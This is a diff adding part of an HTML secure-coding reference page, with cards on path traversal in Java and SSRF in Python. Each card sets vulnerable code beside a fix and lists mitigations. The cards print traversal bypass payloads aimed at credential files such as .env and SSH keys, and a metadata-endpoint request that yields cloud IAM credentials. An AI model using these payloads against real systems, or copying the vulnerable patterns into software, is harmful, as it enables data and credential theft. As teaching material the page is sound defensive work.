+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">A filename from user input is joined with a base directory without sanitizing <code>../</code> sequences. The resulting path escapes the intended directory.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Java</span>
+          <pre><span class="c-cm">// GET /download?file=../../../etc/passwd</span>
+<span class="c-type">String</span> base = <span class="c-str">"/var/www/uploads/"</span>;
+<span class="c-type">String</span> filename = request.<span class="c-fn">getParameter</span>(<span class="c-str">"file"</span>);
+<span class="c-type">File</span> f = <span class="c-kw">new</span> <span class="c-type">File</span>(base + filename);
+
+<span class="c-fn">sendFile</span>(response, f);
+<span class="c-cm">// Resolves to: /etc/passwd</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-type">File</span> base = <span class="c-kw">new</span> <span class="c-type">File</span>(<span class="c-str">"/var/www/uploads"</span>).<span class="c-fn">getCanonicalFile</span>();
+<span class="c-type">File</span> f = <span class="c-kw">new</span> <span class="c-type">File</span>(base, filename).<span class="c-fn">getCanonicalFile</span>();
+
+<span class="c-kw">if</span> (!f.<span class="c-fn">getPath</span>().<span class="c-fn">startsWith</span>(base.<span class="c-fn">getPath</span>() + <span class="c-type">File</span>.separator)) {
+  <span class="c-kw">throw new</span> <span class="c-type">SecurityException</span>(<span class="c-str">"Path traversal detected"</span>);
+}
+<span class="c-fn">sendFile</span>(response, f);</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>Response body contains the contents of <code>/etc/passwd</code>, <code>/proc/self/environ</code> (env vars, database URLs), or application source code. Can be used to read private keys, .env files, or config files. Encoded variants (<code>%2e%2e%2f</code>, <code>..%2F</code>) bypass naive string-based filters.</p>
+          </div>
+          <span class="code-label label-behavior">▸ BYPASS VARIANTS</span>
+          <pre><span class="c-warn">Basic:          ?file=../../../etc/passwd
+URL-encoded:    ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+Double-encoded: ?file=%252e%252e%252f...
+Null byte:      ?file=../../../etc/passwd%00.png
+Windows:        ?file=..\..\windows\win.ini</span>
+
+<span class="c-cm"># What attackers target:</span>
+<span class="c-ok">/etc/passwd          # user enumeration
+/proc/self/environ   # env vars, secrets
+/var/www/.env        # DB creds, API keys
+~/.ssh/id_rsa        # private keys</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Resolve canonical paths and verify they start with base dir</li>
+              <li>Never use raw user input as filenames</li>
+              <li>Use an allowlist of permitted filenames or UUIDs as file keys</li>
+              <li>Serve files through a CDN or object storage instead of filesystem reads</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======= 9. SSRF ======= -->
+  <div class="vuln-card" data-cat="system">
+    <div class="card-header" onclick="toggle(this)">
+      <div class="severity-dot severity-critical"></div>
+      <div class="card-title-block">
+        <div class="card-title">Server-Side Request Forgery (SSRF)</div>
+        <div class="card-meta">
+          <span class="tag tag-system">SYSTEM</span>
+          <span class="tag tag-severity">CRITICAL</span>
+        </div>
+      </div>
+      <span class="expand-icon">▾</span>
+    </div>
+    <div class="card-body">
+      <div class="two-col">
+        <div class="col-section">
+          <div class="section-label">// vulnerable code</div>
+          <p class="description">The server makes an HTTP request to a URL supplied by the user. An attacker uses this to probe internal services, access cloud metadata endpoints, or reach localhost services that are not exposed externally.</p>
+          <span class="code-label label-vuln">▲ VULNERABLE — Python</span>
+          <pre><span class="c-cm"># POST /fetch  body: {"url": "http://169.254.169.254/..."}</span>
+<span class="c-kw">import</span> requests
+
+<span class="c-kw">def</span> <span class="c-fn">fetch_url</span>(url):
+    resp = requests.<span class="c-fn">get</span>(url)  <span class="c-cm"># no validation</span>
+    <span class="c-kw">return</span> resp.text
+
+<span class="c-cm"># Attacker hits AWS EC2 metadata:
+# http://169.254.169.254/latest/meta-data/
+# → returns IAM role credentials</span></pre>
+
+          <span class="code-label label-safe">✓ SAFE</span>
+          <pre><span class="c-kw">from</span> urllib.parse <span class="c-kw">import</span> urlparse
+<span class="c-kw">import</span> ipaddress
+
+<span class="c-kw">def</span> <span class="c-fn">is_safe_url</span>(url):
+    parsed = <span class="c-fn">urlparse</span>(url)
+    host = parsed.hostname
+    <span class="c-kw">try</span>:
+        ip = ipaddress.<span class="c-fn">ip_address</span>(host)
+        <span class="c-kw">if</span> ip.is_private <span class="c-kw">or</span> ip.is_loopback:
+            <span class="c-kw">return False</span>
+    <span class="c-kw">except</span> ValueError:
+        <span class="c-kw">pass</span>  <span class="c-cm"># hostname, not IP — also check DNS</span>
+    <span class="c-kw">return</span> parsed.scheme <span class="c-kw">in</span> [<span class="c-str">'http'</span>, <span class="c-str">'https'</span>]</pre>
+        </div>
+        <div class="col-section">
+          <div class="section-label">// runtime behavior</div>
+          <div class="behavior-block">
+            <p>The server fetches the attacker-supplied URL from inside the network. On AWS/GCP/Azure, the metadata endpoint at <code>169.254.169.254</code> returns temporary IAM credentials, allowing full cloud account takeover. On internal networks, SSRF maps internal services (<code>http://10.0.0.1:8080/admin</code>) that are invisible to the attacker externally.</p>
+          </div>
+          <span class="code-label label-behavior">▸ CLOUD METADATA TAKEOVER</span>
+          <pre><span class="c-warn">POST /api/fetch-preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+← {"AccessKeyId": "ASIA...",
+    "SecretAccessKey": "...",
+    "Token": "...",
+    "Expiration": "2026-05-12T18:00:00Z"}
+
+# Attacker now has temporary AWS keys:
+$ aws s3 ls --no-sign-request (using stolen creds)
+→ Full S3 bucket access, EC2 control</span></pre>
+          <div class="fix-block">
+            <ul>
+              <li>Block requests to private/loopback IPs and link-local ranges</li>
+              <li>Use an allowlist of permitted external domains</li>
+              <li>Disable IMDSv1; require IMDSv2 (token-based) on AWS</li>
+              <li>Run fetch workers in isolated network segments with no internal access</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /vuln-grid -->
+</div><!-- /container -->
+
+<script>
+  function toggle(headerEl) {
+    const card = headerEl.closest('.vuln-card');
+    card.classList.toggle('open');
+  }
+
+  function filterCards(cat, btn) {
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.querySelectorAll('.vuln-card').forEach(card => {
+      if (cat === 'all' || card.dataset.cat === cat) {
+        card.dataset.hidden = 'false';
+        card.style.display = '';
+      } else {
+        card.dataset.hidden = 'true';
+        card.style.display = 'none';
+      }
+    });
+  }
+</script>
+
+</body>
+</html>
